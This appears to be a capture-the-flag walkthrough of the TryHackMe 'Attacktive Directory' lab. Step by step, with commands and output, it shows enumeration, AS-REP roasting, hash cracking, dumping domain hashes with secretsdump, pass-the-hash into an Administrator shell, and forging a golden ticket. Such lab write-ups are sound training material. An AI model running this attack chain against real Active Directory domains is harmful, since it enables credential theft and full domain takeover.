# Attacktive Directory

## Machine Info

NetBIOS computer name: ATTACKTIVEDIRE\
NetBIOS domain name: THM-AD

Domain SID: S-1-5-21-3591857110-2884097990-301047963\
DNS domain: spookysec.local\
FQDN: AttacktiveDirectory.spookysec.local\
Derived membership: domain member\
Derived domain: THM-AD





## Port Scanning

```bash
nmap -T4 -sV -p- --min-rate 1000 --open -oN port_scan.txt 10.10.206.190

Nmap scan report for 10.10.206.190
Host is up (0.040s latency).
Not shown: 53186 closed tcp ports (reset), 12323 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-15 10:38:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
49672/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                                                                                           
49676/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
49679/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
49684/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
49702/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                         
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows 
```



## Initial Access

Enumerate the machine with enum4linux tool

```bash
enum4linux-ng 10.10.206.190
```

We discovered some Domain info like the name of DC, nome of domain, SID, ect...

### UserEnum with Kerbrute

With anonymous access we can enumerate the AD users using Kerbrute.

{% code overflow="wrap" %}
```bash
./kerbrute_linux_amd64 userenum -d THM-AD --dc AttacktiveDirectory.spookysec.local /PATH/TO/Attacktive_Directory/userlist.txt

2025/07/15 13:09:56 >  [+] VALID USERNAME:       james@THM-AD
2025/07/15 13:09:57 >  [+] VALID USERNAME:       svc-admin@THM-AD
2025/07/15 13:09:59 >  [+] VALID USERNAME:       robin@THM-AD
2025/07/15 13:10:06 >  [+] VALID USERNAME:       darkstar@THM-AD
2025/07/15 13:10:10 >  [+] VALID USERNAME:       administrator@THM-AD
2025/07/15 13:10:19 >  [+] VALID USERNAME:       backup@THM-AD
2025/07/15 13:10:23 >  [+] VALID USERNAME:       paradox@THM-AD
2025/07/15 13:16:40 >  [+] VALID USERNAME:       ori@THM-AD
```
{% endcode %}

### AS-REP Reasting with Impacket

We can use the GetNPUsers from impacket to extract the AS-REP Roastable users

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers THM-AD/svc-admin -dc-ip 10.10.206.190 -dc-host THM-AD -no-pass

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@THM-AD:4897cbcf5ec5bbc589d456e653a21f86$e6653b9cc6b8f8aaac589646e1cc22ea067abc0cfd2073553c3aff3024ea5e4762fda4e258152a2f84d55e7eb5e2edede725e22f29651e1eb32abba4a62af64de8abe7a3a82aa392007805e04fef7e619e9f201dd009c93c69cc1f4296866bdf20969d68b3a81b8df9b5408571de5808ee38ebb31c1aa67e62ecd21adeabae01852cffce3dcb28da94b897ea2aa55c54290d95013e183f5e3e552a760dd1eb34494ee662fbf56e7d3aef9d03a01c44be99d1cf95b17569ae4cc3ef1dbe1ce0752de07ab89fdd75c33b2084d43b01f116dfc463ac4f1b331928582629007f7ac60f2ab3c4129d7629ff

```
{% endcode %}

Save this hash in a file and try to crack with Hashcat.

### Crack TGT with Hashcat

{% code overflow="wrap" %}
```bash
hashcat -m 18200 --force -a 0 tgt_tickets.txt passwordlist.txt

[..snip..]
$krb5asrep$23$svc-admin@THM-AD:720bfed21e57e3...:management2005
[..snip..]
```
{% endcode %}

We have crack the hash



## Enumeration with User Creds

With user's credentials we can do a more complete enumeration.

```bash
enum4linux-ng 10.10.206.190 -u 'svc-admin' -p 'management2005'
```

Now using specific tool we will enumerate all services

### SMB Shares

```bash
smbclient -L //10.10.206.190 -U "svc-admin%management2005"

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
```

Let's see the `backup` directory. Try to connect to it.

```bash
smbclient -N //10.10.206.190/backup -U "svc-admin%management2005"
```

```bash
smb: \> ls
  .                                   D        0  Sat Apr  4 21:08:39 2020
  ..                                  D        0  Sat Apr  4 21:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 21:08:53 2020

                8247551 blocks of size 4096. 3945589 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

Then, download and read the juicy file found.

```bash
cat backup_credentials.txt | base64 -d 
backup@spookysec.local:backup2517860
```

### Creds Dump with Impacket

Using the secredsdump tool of impacket we can dump the DC password with the backup user credentials.

{% code overflow="wrap" %}
```bash
impacket-secretsdump THM-AD/backup:backup2517860@10.10.206.190

[..snip..]

Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::.

[..snip..]

Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
```
{% endcode %}

### Perform Pass-The-Hash with Admin hash

```bash
evil-winrm -i 10.10.206.190 -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

We pwnded the entire domain.



## Craft Golden Ticket

Domain SID: S-1-5-21-3591857110-2884097990-301047963

Administrator hash: 0e0363213e37b94221497260b0bcb4fc

NT hash krgtgt: 0e2eb8158c27bed09861033026be4c21

{% code overflow="wrap" %}
```bash
impacket-ticketer -nthash "0e2eb8158c27bed09861033026be4c21" -domain-sid "S-1-5-21-3591857110-2884097990-301047963" -domain "THM-AD" "backup" -groups 512 -user-id 1118
```
{% endcode %}

